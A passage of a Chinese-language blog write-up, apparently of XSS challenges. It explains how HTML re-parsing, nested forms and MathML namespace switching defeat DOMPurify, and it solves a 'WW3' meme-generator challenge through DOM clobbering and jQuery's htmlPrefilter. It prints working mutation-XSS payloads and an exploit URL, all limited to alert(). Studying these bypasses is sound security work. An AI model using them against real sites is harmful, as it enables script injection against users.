的返回值。然后浏览器在分配给 innerHTML 时再次解析：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-3-1536x161.png\" alt=\"\"></p>\n<p>DOM 树与 DOMPurify 处理的树相同，然后附加到文档中。</p>\n<p>所以附加到文档之前需要解析 - 序列化 - 解析。但<strong>两次解析的 DOM 树未必相同</strong>。</p>\n<p>2.HTML 规范有一个问题，它使得创建嵌套 <code>form</code>  元素成为可能。但是，在重新解析时，第二个 <code>form</code>  将消失。</p>\n<p>html 规范中，不允许 form 元素的子元素是 form。那么说明嵌套 form 元素是不被允许的。这会导致嵌套里面的 form 元素被 html 解析器忽略。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form id=form1&gt;</span><br><span class=\"line\">INSIDE_FORM1</span><br><span class=\"line\">&lt;form id=form2&gt;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-5-1536x121.png\" alt=\"\"></p>\n<p>我们可以通过带有错误嵌套标签的稍微损坏的标记，可以创建嵌套表单。</p>\n<p><code>&lt;form id=&quot;outer&quot;&gt;&lt;div&gt;&lt;/form&gt;&lt;form id=&quot;inner&quot;&gt;&lt;input&gt;</code></p>\n<p>它产生以下 DOM 树，其中包含一个嵌套的表单元素：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-6-1536x211.png\" alt=\"\"></p>\n<p>这不是任何特定浏览器中的错误；它直接来自 HTML 规范，并在解析 HTML 的算法中进行了描述。这是一般的想法：</p>\n<ul>\n<li>当你打开一个 <code>&lt;form&gt;</code>  标签时，解析器需要使用<strong>表单元素指针</strong>打开的（在规范中是这样调用的）。如果指针不是 <code>null</code> ，则 <code>form</code>  无法创建元素。</li>\n<li>结束 <code>&lt;form&gt;</code>  标记时，表单元素指针始终设置为 <code>null</code> 。</li>\n</ul>\n<p>注意：一般来说子元素是要紧贴父元素的</p>\n<p>现在，如果我们尝试序列化生成的 DOM 树，我们将得到以下标记：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form id=&quot;outer&quot;&gt;&lt;div&gt;&lt;form id=&quot;inner&quot;&gt;&lt;input&gt;&lt;/form&gt;&lt;/div&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-7-1536x151.png\" alt=\"\"></p>\n<p>所以这证明了序列化后再次解析不能保证返回原始 DOM 树，同时再次解析后内层 form 消失了</p>\n<p>3. 外部内容</p>\n<p>HTML 解析器可以创建一个包含三个命名空间元素的 DOM 树：</p>\n<ul>\n<li>HTML 命名空间</li>\n<li>SVG 命名空间</li>\n<li>MathML 命名空间 ，是 XML 语言的子集 zhangxinxu</li>\n</ul>\n<p>默认情况下，所有元素都在 HTML 命名空间中；但是，如果解析器遇到 <code>&lt;svg&gt;</code> or <code>&lt;math&gt;</code>  元素，则它分别 “切换” 到 SVG 和 MathML 命名空间。并且这两个命名空间都会产生外部内容。</p>\n<p>在外部内容中，标记的解析方式与普通 HTML 不同。这可以在解析 <code>&lt;style&gt;</code>  元素时清楚地显示出来。在 HTML 命名空间中， <code>&lt;style&gt;</code>  只能包含文本；没有后代，并且不解码 HTML 实体。外部内容并非如此：外部内容 <code>&lt;style&gt;</code>  可以有子元素，并且实体被解码。</p>\n<p><code>&lt;style&gt;&lt;a&gt;ABC&lt;/style&gt;&lt;svg&gt;&lt;style&gt;&lt;a&gt;ABC</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-8-1536x308.png\" alt=\"\"></p>\n<p>证明了 svg 命名空间中的 style 可以被解析</p>\n<p>如果我们在里面 <code>&lt;svg&gt;</code> ， <code>&lt;math&gt;</code>  那么所有元素也都在非 HTML 命名空间中。但是这是错误的。HTML 规范中有一些元素称为<strong> MathML 文本集成点</strong>和<strong> HTML 集成点</strong>。这些元素的子元素具有 HTML 命名空间</p>\n<p><code>&lt;math&gt;&lt;style&gt;&lt;a&gt;A&lt;/style&gt;&lt;mtext&gt;&lt;style&gt;&lt;a&gt;B&lt;/style&gt;</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-9-1536x207.png\" alt=\"\"></p>\n<p>请注意 <code>style</code>  作为 math 的直接子元素 <code>在 MathML 命名空间中，而</code> 第二个 style <code>在mtext下则是 HTML 命名空间中。这是因为</code>  mtext` 是<strong> MathML 文本集成点</strong>并使解析器切换命名空间。</p>\n<p>MathML 文本集成点是：</p>\n<ul>\n<li><code>math mi</code></li>\n<li><code>math mo</code></li>\n<li><code>math mn</code></li>\n<li><code>math ms</code></li>\n</ul>\n<p>HTML 集成点是：</p>\n<ul>\n<li><code>math annotation-xml</code>  如果它有一个名为的属性， <code>encoding</code>  其值等于 <code>text/html</code>  或  <code>application/xhtml+xml</code></li>\n<li><code>svg foreignObject</code></li>\n<li><code>svg desc</code></li>\n<li><code>svg title</code></li>\n</ul>\n<p>但并不是所有 mathml 文本集成点和 html 集成点子元素都是 html 命名空间的</p>\n<p>html 规范中，大部分 Mathml 文本集成点的子元素都是 HTML 命名空间的啊，但是除了 <code>&lt;mglyph&gt;&lt;malignmark&gt;</code> 。当这两直接是 Mathml 文本集成点的直接子元素的时候。他们不会切换命名空间。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-10-1536x252.png\" alt=\"\"></p>\n<p>最终 payload1:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;img src onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;img src onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<p>使用以上所有内容，我们可以创建一个包含两个 <code>form</code>  元素和 <code>mglyph</code>  元素的标记，该标记最初位于 HTML 命名空间中，但在重新解析它时位于 MathML 命名空间中，从而使后续 <code>style</code>  标记的解析方式不同并导致 XSS。</p>\n<p>payload 利用错误嵌套的 <code>html form</code>  元素，并且还包含 <code>mglyph</code>  元素。它生成以下 DOM 树：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-11-1536x326.png\" alt=\"\"></p>\n<p>这个 DOM 树是无害的。所有元素都在 DOMPurify 的允许列表中。请注意，这 <code>mglyph</code>  是在 HTML 命名空间中。看起来像 XSS playload 的片段只是 <code>html style</code> . 因为有一个嵌套的 <code>html form</code> ，我们可以非常确定这个 DOM 树将在重新解析时发生变异。</p>\n<p>序列化之后的 html 是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;img src onerror=alert(1)&gt;&lt;/style&gt;&lt;/mglyph&gt;&lt;/form&gt;&lt;/mtext&gt;&lt;/math&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>\n<p>此代码段具有嵌套 <code>form</code>  标签。所以当它被赋值给 时 <code>innerHTML</code> ，它会被解析成下面的 DOM 树：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-12-1536x312.png\" alt=\"\"></p>\n<p>所以现在第二个 <code>html form</code>  没有被创建， <code>mglyph</code>  现在是 mtext 的直接子元素，在 MathML 命名空间中。因此， <code>style</code>  它也在 MathML 命名空间中，因此其内容不被视为文本。然后 <code>&lt;/math&gt;</code>  关闭 <code>&lt;math&gt;</code>  元素，现在 <code>img</code>  在 HTML 命名空间中创建，导致 XSS。</p>\n<p>payload2:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;math&gt;&lt;table id=&quot;&lt;/table&gt;&quot;&gt;&lt;img src onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221009104652050.png\" alt=\"image-20221009104652050\"></p>\n<p>经过二次解析后为</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221009104805809.png\" alt=\"image-20221009104805809\"></p>\n<h2 id=\"ww3\"><a class=\"markdownIt-Anchor\" href=\"#ww3\">#</a> WW3</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDM4NzU4NTQ4MzQtY2RiMDQyYjAtMTUwYS00ZmIzLWIyM2UtMmFlMmI5Zjk5ZTU1Lm1k\">📎World War 3.md</span></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h4</span>&gt;</span>Meme Code<span class=\"tag\">&lt;/<span class=\"name\">h4</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">textarea</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;form-control&quot;</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;meme-code&quot;</span> <span class=\"attr\">rows</span>=<span class=\"string\">&quot;4&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">textarea</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;notify&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-handlebars\"><span class=\"language-xml\"></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    /* Utils */</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    const escape = (dirty) =&gt; unescape(dirty).replace(/[<span class=\"tag\">&lt;&gt;</span>&#x27;&quot;=]/g, &#x27;&#x27;);</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    const memeTemplate = (img, text) =&gt; &#123;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">        return (`<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"><span class=\"keyword\">@import</span> url(<span class=\"string\">&#x27;https://fonts.googleapis.com/css?family=Oswald:700&amp;display=swap&#x27;</span>);`+</span></span></span></span><br><span class=\"line\"><span class=\"language-css\"><span class=\"language-xml\"><span class=\"language-handlebars\">            `<span class=\"selector-class\">.meme-card</span>&#123;<span class=\"attribute\">margin</span>:<span class=\"number\">0</span> auto;<span class=\"attribute\">width</span>:<span class=\"number\">300px</span>&#125;<span class=\"selector-class\">.meme-card</span>&gt;<span class=\"selector-tag\">img</span>&#123;<span class=\"attribute\">width</span>:<span class=\"number\">300px</span>&#125;`+</span></span></span></span><br><span class=\"line\"><span class=\"language-css\"><span class=\"language-xml\"><span class=\"language-handlebars\">            `<span class=\"selector-class\">.meme-card</span>&gt;<span class=\"selector-tag\">h1</span>&#123;<span class=\"attribute\">text-align</span>:center;<span class=\"attribute\">color</span>:<span class=\"number\">#fff</span>;<span class=\"attribute\">background</span>:black;<span class=\"attribute\">margin-top</span>:-<span class=\"number\">5px</span>;`+</span></span></span></span><br><span class=\"line\"><span class=\"language-css\"><span class=\"language-xml\"><span class=\"language-handlebars\">            `<span class=\"attribute\">position</span>:relative;<span class=\"attribute\">font-family</span>:Oswald,sans-serif;<span class=\"attribute\">font-weight</span>:<span class=\"number\">700</span>&#125;</span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span>`+</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">            `<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;meme-card&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;$&#123;img&#125;&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>$&#123;text&#125;<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span>`)</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    &#125;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    const memeGen = (that, notify) =&gt; &#123;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">        if (text &amp;&amp; img) &#123;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">            template = memeTemplate(img, text)</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\"></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">            if (notify) &#123;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">                html = (`<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;alert alert-warning&quot;</span> <span class=\"attr\">role</span>=<span class=\"string\">&quot;alert&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">b</span>&gt;</span>Meme<span class=\"tag\">&lt;/<span class=\"name\">b</span>&gt;</span> created from $&#123;DOMPurify.sanitize(text)&#125;<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span>`)</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">            &#125;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\"></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">            setTimeout(_ =&gt; &#123;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">                $(&#x27;#status&#x27;).remove()</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">                notify ? ($(&#x27;#notify&#x27;).html(html)) : &#x27;&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">                $(&#x27;#meme-code&#x27;).text(template)</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">            &#125;, 1000)</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">        &#125;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    &#125;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\"></span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"comment\">/* Main */</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">let</span> notify = <span class=\"literal\">false</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">let</span> text = <span class=\"keyword\">new</span> <span class=\"title function_\">URL</span>(location).<span class=\"property\">searchParams</span>.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;text&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">let</span> img = <span class=\"keyword\">new</span> <span class=\"title function_\">URL</span>(location).<span class=\"property\">searchParams</span>.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;img&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">if</span> (text &amp;&amp; img) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"variable language_\">document</span>.<span class=\"title function_\">write</span>(</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"string\">`&lt;div class=&quot;alert alert-primary&quot; role=&quot;alert&quot; id=&quot;status&quot;&gt;`</span>+</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"string\">`&lt;img class=&quot;circle&quot; src=&quot;<span class=\"subst\">$&#123;<span class=\"built_in\">escape</span>(img)&#125;</span>&quot; onload=&quot;memeGen(this, notify)&quot;&gt;`</span>+</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"string\">`Creating meme... (<span class=\"subst\">$&#123;DOMPurify.sanitize(text)&#125;</span>)&lt;/div&gt;`</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">        )</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125; <span class=\"keyword\">else</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        $(<span class=\"string\">&#x27;#meme-code&#x27;</span>).<span class=\"title function_\">text</span>(<span class=\"title function_\">memeTemplate</span>(<span class=\"string\">&#x27;https://i.imgur.com/PdbDexI.jpg&#x27;</span>, <span class=\"string\">&#x27;When you get that WW3 draft letter&#x27;</span>))</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">//代码分析，Utils中为函数声明，main中调用了Utils中的函数</span><br><span class=\"line\">//img和text都被escape或者DOMPurify过滤，无法利用这两个参数</span><br><span class=\"line\">//只要text和img为真，会调用memeGen,memeGen会调用memeTemplate，memeTemplate将img和text写入Meme code中</span><br><span class=\"line\">//memeGen只有SetTimeout中notify存在利用点</span><br><span class=\"line\">//当img和text都为真时，会调用memeTemplate，在meme-code中写入该内容</span><br><span class=\"line\">//memeTemplate存在可控变量img和text，但img在src中，并且存在escape函数，无法闭合，只能利用text</span><br><span class=\"line\">//text需要传入两个值：第一个是为了执行jQuery解析而覆盖的notify，第二个是利用了第一个解析产生弹窗的代码</span><br><span class=\"line\">//通过<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">name</span>=<span class=\"string\">notify</span>&gt;</span>覆盖notify,通过<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">style</span>/&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"title function_\">alert</span>(<span class=\"number\">1337</span>)<span class=\"comment\">//</span></span></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span>配合jQuery解析绕过domporify</span><br><span class=\"line\">//进入dompuriy过滤的是<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">style</span>/&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"title function_\">alert</span>(<span class=\"number\">1337</span>)<span class=\"comment\">//</span></span></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span>,此代码被认为合法，但过滤之后又会被jQuery解析，变为：</span><br><span class=\"line\">//<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"title function_\">alert</span>(<span class=\"number\">1337</span>)<span class=\"comment\">//  ,style被闭合，script标签逃逸,完成弹窗   </span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">//第一个img必须是合法的图片才能保证img和text同时为真</span><br></pre></td></tr></table></figure>\n<p>前置知识 1 jquery script 标签逃逸</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTimeout(_ =&gt; &#123;</span><br><span class=\"line\">    $(&#x27;#status&#x27;).remove()</span><br><span class=\"line\">    notify ? ($(&#x27;#notify&#x27;).html(html)) : &#x27;&#x27;</span><br><span class=\"line\">    $(&#x27;#meme-code&#x27;).text(template)</span><br><span class=\"line\">&#125;, 1000)</span><br></pre></td></tr></table></figure>\n<p>两种解析 html 的方式:<strong>jquery.html&amp;innerhtml</strong>。 <code>innerHTML</code>  是原生 js 的写法， <code>Jqury.html()</code>  也是调用原生的 innerHTML 方法，但是加了自己的解析规则</p>\n<p>对于 innerHTML：模拟浏览器自动补全标签，不处理非法标签。同时， <code>&lt;style&gt;</code>  标签中不允许存在子标签 (style 标签最初的设计理念就不能用来放子标签)，如果存在会被当作 text 解析。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;style&gt;</span><br><span class=\"line\">    &lt;style/&gt;&lt;script&gt;alert(1337)//</span><br><span class=\"line\">&lt;/style&gt;</span><br></pre></td></tr></table></figure>\n<p>对于 <code>Jqury.html()</code> ，最终对标签的处理是在 <code>htmlPrefilter()</code>  中实现</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rxhtmlTag = /&lt;(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^/&gt;x20trnf]*)[^&gt;]*)/&gt;/gi</span><br><span class=\"line\">jQuery.extend( &#123;</span><br><span class=\"line\">    htmlPrefilter: function( html ) &#123;</span><br><span class=\"line\">        return html.replace( rxhtmlTag, &quot;&lt;$1&gt;&lt;/$2&gt;&quot; );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">tmp.innerHTML = wrap[ 1 ] + jQuery.htmlPrefilter( elem ) + wrap[ 2 ];</span><br><span class=\"line\"></span><br><span class=\"line\">此处正则匹配完的结果$1和$2均为style</span><br></pre></td></tr></table></figure>\n<p>这个正则表达式在匹配 <code>&lt;*/&gt;</code>  之后会重新生成一对标签 (区别于直接调用 innerHTML)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;style&gt;</span><br><span class=\"line\">    &lt;style&gt;</span><br><span class=\"line\">&lt;/style&gt;</span><br><span class=\"line\">&lt;script&gt;alert(1337)//</span><br></pre></td></tr></table></figure>\n<p>前置知识 2</p>\n<p>首先尝试用 DOM-clobbering 创造一个 id 为 <code>notify</code>  的变量，尝试覆盖 notify 使其变为真，走到为真的条件中，但是这种方式不允许覆盖已经存在的变量。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;img id=notify&gt;</span><br><span class=\"line\">&lt;img src=&quot;&quot; onerror=&quot;memeGen(notify)&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">const memeGen = (notify) =&gt;&#123;</span><br><span class=\"line\">    consol.log(notify);  //false</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">let notify = false;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>但我们可以通过 name 的局部作用域覆盖 notify</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img name=notify&gt;</span><br><span class=\"line\">此时notify为真</span><br></pre></td></tr></table></figure>\n<p>前置知识 3：</p>\n<p>JS 局部作用域和全局作用域</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=&quot;&quot; onerror=&quot;console.log(nickname)&quot;&gt; //pig</span><br><span class=\"line\">&lt;img src=&quot;&quot; onerror=&quot;var nickname=&#x27;dog&#x27;;console.log(nickname)&quot;&gt; //dog</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">window.document.nickname = &#x27;pig&#x27;;</span><br><span class=\"line\">window.nickname = &#x27;cat&#x27;;</span><br><span class=\"line\">&lt;script&gt;</span><br></pre></td></tr></table></figure>\n<p>在 document.write 中 notify 为 false，但通过 img 的局部作用域覆盖了 notify</p>\n<p>在 memeTemplate 中有如下语句：</p>\n<p><code>&lt;div class=&quot;meme-card&quot;&gt;&lt;img src=&quot;$&#123;img&#125;&quot;&gt;&lt;h1&gt;$&#123;text&#125;&lt;/h1&gt;&lt;/div&gt;</code> )</p>\n<p>我们可以将局部作用域的 img 放入 text 中同时利用 jQuery 的解析绕过 dompurify 的过滤</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?img=https://i.imgur.com/PdbDexI.jpg&amp;text=&lt;img%20name=notify&gt;&lt;style&gt;&lt;style/&gt;&lt;script&gt;alert()//</span><br></pre></td></tr></table></figure>\n<p>执行之后写入 memecode，div 中 script 标签被解析，完成弹窗</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221012162102961.png\" alt=\"image-20221012162102961\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td 